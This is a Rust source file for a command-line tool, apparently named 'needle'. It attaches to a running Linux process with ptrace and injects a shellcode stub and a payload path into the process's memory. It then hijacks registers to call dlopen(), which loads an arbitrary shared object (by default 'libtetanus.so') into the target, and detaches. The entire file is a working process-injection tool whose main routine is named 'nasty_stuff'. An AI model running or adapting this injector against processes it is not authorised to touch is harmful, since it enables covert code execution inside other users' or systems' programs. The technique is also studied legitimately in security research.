mod syscalls;
mod executors;
mod senders;
mod injector;
mod explorers;

use std::path::PathBuf;

use injector::RemoteOperation;
use nix::{Result, {sys::{ptrace, wait::waitpid}, unistd::Pid}};
use clap::Parser;

use executors::RemoteShellcode;
use senders::RemoteString;
use explorers::step_to_syscall;

use crate::explorers::{find_libc, find_dlopen};

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct NeedleArgs {
	/// target process pid
	pid: i32,

	/// shared object to inject into target process
	#[arg(short, long, default_value = "./target/debug/libtetanus.so")]
	payload: String,

	/// exact address of dlopen function, calculated with `base + offset` if not given
	#[arg(long)]
	addr: Option<usize>,

	/// base address of libc in memory (minus offset), calculated with /proc/<pid>/maps if not given
	#[arg(long)]
	base: Option<usize>,

	/// offset address of dlopen inside libc, calculated reading libc ELF if not given
	#[arg(long)]
	offset: Option<usize>,

	/// path of libc shared object on disk, used to calculate symbol offset in ELF
	#[arg(long)]
	path: Option<PathBuf>,
}

fn nasty_stuff(args: NeedleArgs) -> Result<()> {
	let pid = Pid::from_raw(args.pid);

	ptrace::attach(pid)?;
	waitpid(pid, None)?;
	println!("Attached to process #{}", args.pid);

	// continue running process step-by-step until we find a syscall
	let syscall = step_to_syscall(pid)?; // TODO no real need to step...
	let original_regs = ptrace::getregs(pid)?; // store original regs to restore after injecting

	// move path to our payload into target address space
	let tetanus = RemoteString::new(args.payload + "\0")
		.inject(pid, syscall)?;
	
	// find dlopen address
	// TODO make this part less spaghetti
	let dlopen_addr;
	if let Some(addr) = args.addr {
		dlopen_addr = addr;
	} else {
		let (mut calc_base, mut calc_fpath) = (0, "".into()); // rust complains about uninitialized...
		if args.path.is_none() || args.base.is_none() { // if user gives both no need to calculate it
			(calc_base, calc_fpath) = find_libc(pid).expect("could not read proc maps of process");
		}

		let base = match args.base {
			Some(b) => b,
			None    => calc_base,
		};

		let fpath = match args.path {
			Some(p) => p,
			None    => calc_fpath,
		};

		let offset = match args.offset {
			Some(o) => o,
			None    => find_dlopen(&fpath).expect("could not read libc shared object")
		};

		dlopen_addr = base + offset;
	}

	println!("Attempting to invoke dlopen() @ 0x{:X}", dlopen_addr);

	let shellcode = [ //  doesn't really spawn a shell soooooo not really shellcode?
		0x55,                                        // pusb  rbp
		0x48, 0x89, 0xE5,                            // mov   rbp,  rsp
		0xFF, 0x15, 0x08, 0x00, 0x00, 0x00,          // call  [rip+0x8] # fake call to store RIP
		0xCC,                                        // trap <--- ret should land here
		0x90,                                        // nop
		0x90,                                        // nop  <--- call should land here
		0xCC,                                        // trap
	];

	RemoteShellcode::new(&shellcode)
		.inject(pid, syscall)?;

	// intercept our mock CALL and redirect it to dlopen real address (also fill args)
	let mut regs = ptrace::getregs(pid)?;
	regs.rip = dlopen_addr as u64;
	regs.rdi = tetanus;
	regs.rsi = 0x1;
	ptrace::setregs(pid, regs)?;
	ptrace::cont(pid, None)?;
	waitpid(pid, None)?;
	println!("Injected dlopen() call");

	// restore original registers and detach
	// TODO clean allocated areas
	ptrace::setregs(pid, original_regs)?;
	ptrace::detach(pid, None)?;
	println!("Released process #{}", args.pid);

	Ok(())
}

fn main() {
	let args = NeedleArgs::parse();

	if let Err(e) = nasty_stuff(args) {
		eprintln!("Error while injecting : {} ({})", e, e.desc());
	}
}
